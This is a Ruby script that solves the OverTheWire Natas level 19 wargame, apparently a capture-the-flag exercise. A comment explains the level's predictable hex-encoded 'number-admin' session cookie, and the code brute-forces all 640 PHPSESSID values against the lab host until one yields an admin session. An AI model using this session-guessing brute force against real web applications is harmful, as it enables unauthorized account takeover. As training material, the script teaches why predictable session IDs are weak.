=begin
29 July 2017
This level uses a predictable session cookie. This cookie is 123-admin where 123 is a number between 1 and 640.
This value is then converted to hex to obfuscate it. We can authenticate as admin by brute forcing the session id.
=end

require 'net/http'

host = 'natas19.natas.labs.overthewire.org'
uri = URI("http://#{host}/index.php")
username = 'natas19'

print "Password please: " # Ask user for the password
password = gets.chomp

puts "Brute force starting."

# Can be brute forced with a simple loop
640.times do |i|
  print "Trying brute force: #{i}\r"
  # Initialize request object
  req = Net::HTTP::Get.new(uri)
  req.basic_auth username, password

  # Create the cookie
  id = i.to_s.unpack('H*')[0] + "2d61646d696e" # The index plus -admin in hex
  req['cookie'] = "PHPSESSID=#{id}"
  res = Net::HTTP.start(uri.hostname, uri.port) { |http|
    http.request(req)
  }
  abort("Error: Non-200 response: #{res.code} #{res.message}") unless res.code == "200" # Error handling
  # Check if we found an admin session id. If we did, exit and show the response body.
  if res.body.include? "You are an admin"
    print "\033[K"
    puts "Success!"
    puts res.body
    break
  end
end
